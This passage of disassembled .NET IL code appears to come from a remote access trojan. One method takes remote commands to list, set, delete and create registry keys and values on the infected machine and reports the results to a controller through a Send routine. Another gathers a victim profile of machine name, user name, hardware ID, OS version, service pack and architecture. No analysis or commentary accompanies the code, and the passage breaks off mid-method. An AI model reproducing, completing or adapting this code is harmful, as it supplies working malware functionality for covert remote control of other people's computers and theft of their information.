      IL_18ff:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1904:  ldc.i4.0
      IL_1905:  ceq
      IL_1907:  stloc.s    V_110
      IL_1909:  ldloc.s    V_110
      IL_190b:  brfalse    IL_1b3c

      IL_1910:  ldloc.0
      IL_1911:  ldc.i4.2
      IL_1912:  ldelem.ref
      IL_1913:  call       class [mscorlib]Microsoft.Win32.RegistryKey ClassLibrary1.OK::GetKey(string)
      IL_1918:  stloc.s    V_79
      IL_191a:  nop
      IL_191b:  ldloc.0
      IL_191c:  ldc.i4.1
      IL_191d:  ldelem.ref
      IL_191e:  stloc.s    V_104
      IL_1920:  nop
      IL_1921:  ldloc.s    V_104
      IL_1923:  ldstr      "~"
      IL_1928:  ldc.i4.0
      IL_1929:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_192e:  ldc.i4.0
      IL_192f:  ceq
      IL_1931:  stloc.s    V_110
      IL_1933:  ldloc.s    V_110
      IL_1935:  brfalse    IL_1a91

      IL_193a:  nop
      IL_193b:  ldc.i4.6
      IL_193c:  newarr     [mscorlib]System.String
      IL_1941:  stloc.s    V_94
      IL_1943:  ldloc.s    V_94
      IL_1945:  ldc.i4.0
      IL_1946:  ldstr      "RG"
      IL_194b:  stelem.ref
      IL_194c:  nop
      IL_194d:  ldloc.s    V_94
      IL_194f:  ldc.i4.1
      IL_1950:  ldsfld     string ClassLibrary1.OK::Y
      IL_1955:  stelem.ref
      IL_1956:  nop
      IL_1957:  ldloc.s    V_94
      IL_1959:  ldc.i4.2
      IL_195a:  ldstr      "~"
      IL_195f:  stelem.ref
      IL_1960:  nop
      IL_1961:  ldloc.s    V_94
      IL_1963:  ldc.i4.3
      IL_1964:  ldsfld     string ClassLibrary1.OK::Y
      IL_1969:  stelem.ref
      IL_196a:  nop
      IL_196b:  ldloc.s    V_94
      IL_196d:  ldc.i4.4
      IL_196e:  ldloc.0
      IL_196f:  ldc.i4.2
      IL_1970:  ldelem.ref
      IL_1971:  stelem.ref
      IL_1972:  nop
      IL_1973:  ldloc.s    V_94
      IL_1975:  ldc.i4.5
      IL_1976:  ldsfld     string ClassLibrary1.OK::Y
      IL_197b:  stelem.ref
      IL_197c:  nop
      IL_197d:  ldloc.s    V_94
      IL_197f:  call       string [mscorlib]System.String::Concat(string[])
      IL_1984:  stloc.s    V_81
      IL_1986:  ldstr      ""
      IL_198b:  stloc.s    V_80
      IL_198d:  ldloc.s    V_79
      IL_198f:  callvirt   instance string[] [mscorlib]Microsoft.Win32.RegistryKey::GetSubKeyNames()
      IL_1994:  stloc.s    V_106
      IL_1996:  ldc.i4.0
      IL_1997:  stloc.s    V_105
      IL_1999:  br.s       IL_19cf

      IL_199b:  ldloc.s    V_106
      IL_199d:  ldloc.s    V_105
      IL_199f:  ldelem.ref
      IL_19a0:  stloc.s    V_82
      IL_19a2:  ldloc.s    V_82
      IL_19a4:  ldstr      "\\"
      IL_19a9:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_19ae:  ldc.i4.0
      IL_19af:  ceq
      IL_19b1:  stloc.s    V_110
      IL_19b3:  ldloc.s    V_110
      IL_19b5:  brfalse.s  IL_19c7

      IL_19b7:  ldloc.s    V_80
      IL_19b9:  ldloc.s    V_82
      IL_19bb:  ldsfld     string ClassLibrary1.OK::Y
      IL_19c0:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_19c5:  stloc.s    V_80
      IL_19c7:  nop
      IL_19c8:  ldloc.s    V_105
      IL_19ca:  ldc.i4.1
      IL_19cb:  add.ovf
      IL_19cc:  stloc.s    V_105
      IL_19ce:  nop
      IL_19cf:  ldloc.s    V_105
      IL_19d1:  ldloc.s    V_106
      IL_19d3:  ldlen
      IL_19d4:  conv.ovf.i4
      IL_19d5:  clt
      IL_19d7:  stloc.s    V_110
      IL_19d9:  ldloc.s    V_110
      IL_19db:  brtrue.s   IL_199b

      IL_19dd:  ldloc.s    V_79
      IL_19df:  callvirt   instance string[] [mscorlib]Microsoft.Win32.RegistryKey::GetValueNames()
      IL_19e4:  stloc.s    V_108
      IL_19e6:  ldc.i4.0
      IL_19e7:  stloc.s    V_107
      IL_19e9:  br.s       IL_1a66

      IL_19eb:  ldloc.s    V_108
      IL_19ed:  ldloc.s    V_107
      IL_19ef:  ldelem.ref
      IL_19f0:  stloc.s    V_83
      IL_19f2:  ldc.i4.7
      IL_19f3:  newarr     [mscorlib]System.String
      IL_19f8:  stloc.s    V_94
      IL_19fa:  ldloc.s    V_94
      IL_19fc:  ldc.i4.0
      IL_19fd:  ldloc.s    V_80
      IL_19ff:  stelem.ref
      IL_1a00:  nop
      IL_1a01:  ldloc.s    V_94
      IL_1a03:  ldc.i4.1
      IL_1a04:  ldloc.s    V_83
      IL_1a06:  stelem.ref
      IL_1a07:  nop
      IL_1a08:  ldloc.s    V_94
      IL_1a0a:  ldc.i4.2
      IL_1a0b:  ldstr      "/"
      IL_1a10:  stelem.ref
      IL_1a11:  nop
      IL_1a12:  ldloc.s    V_94
      IL_1a14:  ldc.i4.3
      IL_1a15:  ldloc.s    V_79
      IL_1a17:  ldloc.s    V_83
      IL_1a19:  callvirt   instance valuetype [mscorlib]Microsoft.Win32.RegistryValueKind [mscorlib]Microsoft.Win32.RegistryKey::GetValueKind(string)
      IL_1a1e:  box        [mscorlib]Microsoft.Win32.RegistryValueKind
      IL_1a23:  callvirt   instance string [mscorlib]System.Enum::ToString()
      IL_1a28:  stelem.ref
      IL_1a29:  nop
      IL_1a2a:  ldloc.s    V_94
      IL_1a2c:  ldc.i4.4
      IL_1a2d:  ldstr      "/"
      IL_1a32:  stelem.ref
      IL_1a33:  nop
      IL_1a34:  ldloc.s    V_94
      IL_1a36:  ldc.i4.5
      IL_1a37:  ldloc.s    V_79
      IL_1a39:  ldloc.s    V_83
      IL_1a3b:  ldstr      ""
      IL_1a40:  callvirt   instance object [mscorlib]Microsoft.Win32.RegistryKey::GetValue(string,
                                                                                           object)
      IL_1a45:  callvirt   instance string [mscorlib]System.Object::ToString()
      IL_1a4a:  stelem.ref
      IL_1a4b:  nop
      IL_1a4c:  ldloc.s    V_94
      IL_1a4e:  ldc.i4.6
      IL_1a4f:  ldsfld     string ClassLibrary1.OK::Y
      IL_1a54:  stelem.ref
      IL_1a55:  nop
      IL_1a56:  ldloc.s    V_94
      IL_1a58:  call       string [mscorlib]System.String::Concat(string[])
      IL_1a5d:  stloc.s    V_80
      IL_1a5f:  ldloc.s    V_107
      IL_1a61:  ldc.i4.1
      IL_1a62:  add.ovf
      IL_1a63:  stloc.s    V_107
      IL_1a65:  nop
      IL_1a66:  ldloc.s    V_107
      IL_1a68:  ldloc.s    V_108
      IL_1a6a:  ldlen
      IL_1a6b:  conv.ovf.i4
      IL_1a6c:  clt
      IL_1a6e:  stloc.s    V_110
      IL_1a70:  ldloc.s    V_110
      IL_1a72:  brtrue     IL_19eb

      IL_1a77:  ldloc.s    V_81
      IL_1a79:  ldloc.s    V_80
      IL_1a7b:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_1a80:  call       bool ClassLibrary1.OK::Send(string)
      IL_1a85:  pop
      IL_1a86:  nop
      IL_1a87:  br         IL_1b3b

      IL_1a8c:  br         IL_1b3b

      IL_1a91:  nop
      IL_1a92:  ldloc.s    V_104
      IL_1a94:  ldstr      "!"
      IL_1a99:  ldc.i4.0
      IL_1a9a:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1a9f:  ldc.i4.0
      IL_1aa0:  ceq
      IL_1aa2:  stloc.s    V_110
      IL_1aa4:  ldloc.s    V_110
      IL_1aa6:  brfalse.s  IL_1ac4

      IL_1aa8:  nop
      IL_1aa9:  ldloc.s    V_79
      IL_1aab:  ldloc.0
      IL_1aac:  ldc.i4.3
      IL_1aad:  ldelem.ref
      IL_1aae:  ldloc.0
      IL_1aaf:  ldc.i4.4
      IL_1ab0:  ldelem.ref
      IL_1ab1:  ldloc.0
      IL_1ab2:  ldc.i4.5
      IL_1ab3:  ldelem.ref
      IL_1ab4:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_1ab9:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object,
                                                                                         valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_1abe:  nop
      IL_1abf:  nop
      IL_1ac0:  br.s       IL_1b3b

      IL_1ac2:  br.s       IL_1b3b

      IL_1ac4:  nop
      IL_1ac5:  ldloc.s    V_104
      IL_1ac7:  ldstr      "@"
      IL_1acc:  ldc.i4.0
      IL_1acd:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1ad2:  ldc.i4.0
      IL_1ad3:  ceq
      IL_1ad5:  stloc.s    V_110
      IL_1ad7:  ldloc.s    V_110
      IL_1ad9:  brfalse.s  IL_1aed

      IL_1adb:  nop
      IL_1adc:  ldloc.s    V_79
      IL_1ade:  ldloc.0
      IL_1adf:  ldc.i4.3
      IL_1ae0:  ldelem.ref
      IL_1ae1:  ldc.i4.0
      IL_1ae2:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteValue(string,
                                                                                            bool)
      IL_1ae7:  nop
      IL_1ae8:  nop
      IL_1ae9:  br.s       IL_1b3b

      IL_1aeb:  br.s       IL_1b3b

      IL_1aed:  nop
      IL_1aee:  ldloc.s    V_104
      IL_1af0:  ldstr      "#"
      IL_1af5:  ldc.i4.0
      IL_1af6:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1afb:  ldc.i4.0
      IL_1afc:  ceq
      IL_1afe:  stloc.s    V_110
      IL_1b00:  ldloc.s    V_110
      IL_1b02:  brfalse.s  IL_1b15

      IL_1b04:  nop
      IL_1b05:  ldloc.s    V_79
      IL_1b07:  ldloc.0
      IL_1b08:  ldc.i4.3
      IL_1b09:  ldelem.ref
      IL_1b0a:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::CreateSubKey(string)
      IL_1b0f:  pop
      IL_1b10:  nop
      IL_1b11:  br.s       IL_1b3b

      IL_1b13:  br.s       IL_1b3b

      IL_1b15:  nop
      IL_1b16:  ldloc.s    V_104
      IL_1b18:  ldstr      "$"
      IL_1b1d:  ldc.i4.0
      IL_1b1e:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1b23:  ldc.i4.0
      IL_1b24:  ceq
      IL_1b26:  stloc.s    V_110
      IL_1b28:  ldloc.s    V_110
      IL_1b2a:  brfalse.s  IL_1b3b

      IL_1b2c:  nop
      IL_1b2d:  ldloc.s    V_79
      IL_1b2f:  ldloc.0
      IL_1b30:  ldc.i4.3
      IL_1b31:  ldelem.ref
      IL_1b32:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteSubKeyTree(string)
      IL_1b37:  nop
      IL_1b38:  nop
      IL_1b39:  br.s       IL_1b3b

      IL_1b3b:  nop
      IL_1b3c:  nop
      IL_1b3d:  leave      IL_1bd1

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_1b42:  dup
      IL_1b43:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_1b48:  stloc.s    V_85
      IL_1b4a:  nop
      IL_1b4b:  ldloc.s    V_85
      IL_1b4d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_1b52:  nop
      IL_1b53:  ldloc.s    V_85
      IL_1b55:  stloc.s    V_84
      IL_1b57:  nop
      .try
      {
        IL_1b58:  ldc.i4.5
        IL_1b59:  newarr     [mscorlib]System.String
        IL_1b5e:  stloc.s    V_94
        IL_1b60:  ldloc.s    V_94
        IL_1b62:  ldc.i4.0
        IL_1b63:  ldstr      "ER"
        IL_1b68:  stelem.ref
        IL_1b69:  nop
        IL_1b6a:  ldloc.s    V_94
        IL_1b6c:  ldc.i4.1
        IL_1b6d:  ldsfld     string ClassLibrary1.OK::Y
        IL_1b72:  stelem.ref
        IL_1b73:  nop
        IL_1b74:  ldloc.s    V_94
        IL_1b76:  ldc.i4.2
        IL_1b77:  ldloc.0
        IL_1b78:  ldc.i4.0
        IL_1b79:  ldelem.ref
        IL_1b7a:  stelem.ref
        IL_1b7b:  nop
        IL_1b7c:  ldloc.s    V_94
        IL_1b7e:  ldc.i4.3
        IL_1b7f:  ldsfld     string ClassLibrary1.OK::Y
        IL_1b84:  stelem.ref
        IL_1b85:  nop
        IL_1b86:  ldloc.s    V_94
        IL_1b88:  ldc.i4.4
        IL_1b89:  ldloc.s    V_84
        IL_1b8b:  callvirt   instance string [mscorlib]System.Exception::get_Message()
        IL_1b90:  stelem.ref
        IL_1b91:  nop
        IL_1b92:  ldloc.s    V_94
        IL_1b94:  call       string [mscorlib]System.String::Concat(string[])
        IL_1b99:  call       bool ClassLibrary1.OK::Send(string)
        IL_1b9e:  pop
        IL_1b9f:  leave.s    IL_1bc3

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_1ba1:  dup
        IL_1ba2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_1ba7:  stloc.s    V_87
        IL_1ba9:  nop
        IL_1baa:  ldloc.s    V_87
        IL_1bac:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_1bb1:  nop
        IL_1bb2:  ldloc.s    V_87
        IL_1bb4:  stloc.s    V_86
        IL_1bb6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_1bbb:  nop
        IL_1bbc:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_1bc1:  leave.s    IL_1bc3

      }  // end handler
      IL_1bc3:  nop
      IL_1bc4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_1bc9:  nop
      IL_1bca:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_1bcf:  leave.s    IL_1bd1

    }  // end handler
    IL_1bd1:  nop
    IL_1bd2:  nop
    IL_1bd3:  ret
  } // end of method OK::Ind

  .method public static string  inf() cil managed
  {
    // Code size       1117 (0x45d)
    .maxstack  4
    .locals init (string V_0,
             string V_1,
             string V_2,
             class [mscorlib]System.Exception V_3,
             class [mscorlib]System.Exception V_4,
             class [mscorlib]System.Exception V_5,
             class [mscorlib]System.Exception V_6,
             class [mscorlib]System.Exception V_7,
             class [mscorlib]System.Exception V_8,
             class [mscorlib]System.Exception V_9,
             class [mscorlib]System.Exception V_10,
             string[] V_11,
             class [mscorlib]System.Exception V_12,
             class [mscorlib]System.Exception V_13,
             class [mscorlib]System.Exception V_14,
             class [mscorlib]System.Exception V_15,
             string V_16,
             class [mscorlib]System.Exception V_17,
             class [mscorlib]System.Exception V_18,
             string V_19,
             string V_20,
             string[] V_21,
             int32 V_22,
             string[] V_23,
             bool V_24)
    IL_0000:  nop
    IL_0001:  ldstr      "lv"
    IL_0006:  ldsfld     string ClassLibrary1.OK::Y
    IL_000b:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0010:  stloc.1
    IL_0011:  nop
    .try
    {
      IL_0012:  ldstr      "vn"
      IL_0017:  call       string ClassLibrary1.OK::GTV(string)
      IL_001c:  ldstr      ""
      IL_0021:  ldc.i4.0
      IL_0022:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0027:  ldc.i4.0
      IL_0028:  ceq
      IL_002a:  stloc.s    V_24
      IL_002c:  ldloc.s    V_24
      IL_002e:  brfalse.s  IL_0060

      IL_0030:  ldloc.1
      IL_0031:  ldsflda    string ClassLibrary1.OK::VN
      IL_0036:  call       string ClassLibrary1.OK::DEB(string&)
      IL_003b:  ldstr      "_"
      IL_0040:  call       string ClassLibrary1.OK::HWD()
      IL_0045:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_004a:  stloc.s    V_19
      IL_004c:  ldloca.s   V_19
      IL_004e:  call       string ClassLibrary1.OK::ENB(string&)
      IL_0053:  ldsfld     string ClassLibrary1.OK::Y
      IL_0058:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_005d:  stloc.1
      IL_005e:  br.s       IL_0098

      IL_0060:  nop
      IL_0061:  ldloc.1
      IL_0062:  ldstr      "vn"
      IL_0067:  call       string ClassLibrary1.OK::GTV(string)
      IL_006c:  stloc.s    V_19
      IL_006e:  ldloca.s   V_19
      IL_0070:  call       string ClassLibrary1.OK::DEB(string&)
      IL_0075:  ldstr      "_"
      IL_007a:  call       string ClassLibrary1.OK::HWD()
      IL_007f:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0084:  stloc.s    V_20
      IL_0086:  ldloca.s   V_20
      IL_0088:  call       string ClassLibrary1.OK::ENB(string&)
      IL_008d:  ldsfld     string ClassLibrary1.OK::Y
      IL_0092:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0097:  stloc.1
      IL_0098:  nop
      IL_0099:  leave.s    IL_00d6

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_009b:  dup
      IL_009c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00a1:  stloc.s    V_4
      IL_00a3:  nop
      IL_00a4:  ldloc.s    V_4
      IL_00a6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00ab:  nop
      IL_00ac:  ldloc.s    V_4
      IL_00ae:  stloc.3
      IL_00af:  ldloc.1
      IL_00b0:  call       string ClassLibrary1.OK::HWD()
      IL_00b5:  stloc.s    V_20
      IL_00b7:  ldloca.s   V_20
      IL_00b9:  call       string ClassLibrary1.OK::ENB(string&)
      IL_00be:  ldsfld     string ClassLibrary1.OK::Y
      IL_00c3:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00c8:  stloc.1
      IL_00c9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00ce:  nop
      IL_00cf:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00d4:  leave.s    IL_00d6

    }  // end handler
    IL_00d6:  nop
    IL_00d7:  nop
    .try
    {
      IL_00d8:  ldloc.1
      IL_00d9:  call       string [mscorlib]System.Environment::get_MachineName()
      IL_00de:  ldsfld     string ClassLibrary1.OK::Y
      IL_00e3:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00e8:  stloc.1
      IL_00e9:  leave.s    IL_011e

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00eb:  dup
      IL_00ec:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00f1:  stloc.s    V_6
      IL_00f3:  nop
      IL_00f4:  ldloc.s    V_6
      IL_00f6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00fb:  nop
      IL_00fc:  ldloc.s    V_6
      IL_00fe:  stloc.s    V_5
      IL_0100:  ldloc.1
      IL_0101:  ldstr      "\?\?"
      IL_0106:  ldsfld     string ClassLibrary1.OK::Y
      IL_010b:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0110:  stloc.1
      IL_0111:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0116:  nop
      IL_0117:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_011c:  leave.s    IL_011e

    }  // end handler
    IL_011e:  nop
    IL_011f:  nop
    .try
    {
      IL_0120:  ldloc.1
      IL_0121:  call       string [mscorlib]System.Environment::get_UserName()
      IL_0126:  ldsfld     string ClassLibrary1.OK::Y
      IL_012b:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0130:  stloc.1
      IL_0131:  leave.s    IL_0166

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0133:  dup
      IL_0134:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0139:  stloc.s    V_8
      IL_013b:  nop
      IL_013c:  ldloc.s    V_8
      IL_013e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0143:  nop
      IL_0144:  ldloc.s    V_8
      IL_0146:  stloc.s    V_7
      IL_0148:  ldloc.1
      IL_0149:  ldstr      "\?\?"
      IL_014e:  ldsfld     string ClassLibrary1.OK::Y
      IL_0153:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0158:  stloc.1
      IL_0159:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_015e:  nop
      IL_015f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0164:  leave.s    IL_0166

    }  // end handler
    IL_0166:  nop
    IL_0167:  ldc.i4.5
    IL_0168:  newarr     [mscorlib]System.String
    IL_016d:  stloc.s    V_21
    IL_016f:  ldloc.s    V_21
    IL_0171:  ldc.i4.0
    IL_0172:  ldloc.1
    IL_0173:  stelem.ref
    IL_0174:  nop
    IL_0175:  ldloc.s    V_21
    IL_0177:  ldc.i4.1
    IL_0178:  call       string ClassLibrary1.OK::FR()
    IL_017d:  stelem.ref
    IL_017e:  nop
    IL_017f:  ldloc.s    V_21
    IL_0181:  ldc.i4.2
    IL_0182:  ldsfld     string ClassLibrary1.OK::Y
    IL_0187:  stelem.ref
    IL_0188:  nop
    IL_0189:  ldloc.s    V_21
    IL_018b:  ldc.i4.3
    IL_018c:  ldstr      ""
    IL_0191:  stelem.ref
    IL_0192:  nop
    IL_0193:  ldloc.s    V_21
    IL_0195:  ldc.i4.4
    IL_0196:  ldsfld     string ClassLibrary1.OK::Y
    IL_019b:  stelem.ref
    IL_019c:  nop
    IL_019d:  ldloc.s    V_21
    IL_019f:  call       string [mscorlib]System.String::Concat(string[])
    IL_01a4:  stloc.1
    IL_01a5:  nop
    .try
    {
      IL_01a6:  ldloc.1
      IL_01a7:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer ClassLibrary1.OK::F
      IL_01ac:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ComputerInfo [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Info()
      IL_01b1:  callvirt   instance string [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ComputerInfo::get_OSFullName()
      IL_01b6:  ldstr      "Microsoft"
      IL_01bb:  ldstr      ""
      IL_01c0:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_01c5:  ldstr      "Windows"
      IL_01ca:  ldstr      "Win"
      IL_01cf:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_01d4:  ldstr      bytearray (AE 00 ) 
      IL_01d9:  ldstr      ""
      IL_01de:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_01e3:  ldstr      bytearray (22 21 )                                           // "!
      IL_01e8:  ldstr      ""
      IL_01ed:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_01f2:  ldstr      "  "
      IL_01f7:  ldstr      " "
      IL_01fc:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_0201:  ldstr      " Win"
      IL_0206:  ldstr      "Win"
      IL_020b:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_0210:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0215:  stloc.1
      IL_0216:  leave.s    IL_0246

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0218:  dup
      IL_0219:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_021e:  stloc.s    V_9
      IL_0220:  nop
      IL_0221:  ldloc.s    V_9
      IL_0223:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0228:  nop
      IL_0229:  ldloc.s    V_9
      IL_022b:  stloc.s    V_10
      IL_022d:  ldloc.1
      IL_022e:  ldstr      "\?\?"
      IL_0233:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0238:  stloc.1
      IL_0239:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_023e:  nop
      IL_023f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0244:  leave.s    IL_0246

    }  // end handler
    IL_0246:  nop
    IL_0247:  ldloc.1
    IL_0248:  ldstr      "SP"
    IL_024d:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0252:  stloc.1
    IL_0253:  nop
    .try
    {
      IL_0254:  call       class [mscorlib]System.OperatingSystem [mscorlib]System.Environment::get_OSVersion()
      IL_0259:  callvirt   instance string [mscorlib]System.OperatingSystem::get_ServicePack()
      IL_025e:  ldstr      " "
      IL_0263:  ldc.i4.m1
      IL_0264:  ldc.i4.0
      IL_0265:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                                string,
                                                                                                int32,
                                                                                                valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
      IL_026a:  stloc.s    V_11
      IL_026c:  ldloc.s    V_11
      IL_026e:  ldlen
      IL_026f:  conv.ovf.i4
      IL_0270:  ldc.i4.1
      IL_0271:  ceq
      IL_0273:  stloc.s    V_24
      IL_0275:  ldloc.s    V_24
      IL_0277:  brfalse.s  IL_0285

      IL_0279:  ldloc.1
      IL_027a:  ldstr      "0"
      IL_027f:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0284:  stloc.1
      IL_0285:  nop
      IL_0286:  ldloc.1
      IL_0287:  ldloc.s    V_11
      IL_0289:  ldloc.s    V_11
      IL_028b:  ldlen
      IL_028c:  conv.ovf.i4
      IL_028d:  ldc.i4.1
      IL_028e:  sub.ovf
      IL_028f:  ldelem.ref
      IL_0290:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0295:  stloc.1
      IL_0296:  leave.s    IL_02c6

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0298:  dup
      IL_0299:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_029e:  stloc.s    V_12
      IL_02a0:  nop
      IL_02a1:  ldloc.s    V_12
      IL_02a3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_02a8:  nop
      IL_02a9:  ldloc.s    V_12
      IL_02ab:  stloc.s    V_13
      IL_02ad:  ldloc.1
      IL_02ae:  ldstr      "0"
      IL_02b3:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_02b8:  stloc.1
      IL_02b9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_02be:  nop
      IL_02bf:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_02c4:  leave.s    IL_02c6

    }  // end handler
    IL_02c6:  nop
    IL_02c7:  nop
    .try
    {
      IL_02c8:  ldc.i4.s   38
      IL_02ca:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_02cf:  ldstr      "x86"
      IL_02d4:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_02d9:  stloc.s    V_24
      IL_02db:  ldloc.s    V_24
      IL_02dd:  brfalse.s  IL_02f2

      IL_02df:  ldloc.1
      IL_02e0:  ldstr      " x64"
      IL_02e5:  ldsfld     string ClassLibrary1.OK::Y
      IL_02ea:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_02ef:  stloc.1
      IL_02f0:  br.s       IL_0304

      IL_02f2:  nop
      IL_02f3:  ldloc.1
      IL_02f4:  ldstr      " x86"
